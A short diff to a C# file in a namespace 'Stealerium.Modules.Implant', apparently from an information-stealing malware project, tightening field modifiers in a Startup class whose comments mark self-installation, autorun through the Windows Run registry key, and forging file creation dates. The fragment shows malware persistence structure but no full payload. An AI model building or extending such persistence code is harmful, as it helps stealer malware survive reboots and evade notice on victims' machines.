@@ -8,14 +8,14 @@ namespace Stealerium.Modules.Implant
     internal sealed class Startup
     {
         // Install
-        public static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;
+        private static readonly string ExecutablePath = AppDomain.CurrentDomain.BaseDirectory;
         private static readonly string InstallDirectory = Paths.InitWorkDir();
 
         private static readonly string InstallFile = Path.Combine(
             InstallDirectory, new FileInfo(ExecutablePath).Name);
 
         // Autorun
-        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+        private const string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
         private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);
 
         // Change file creation date
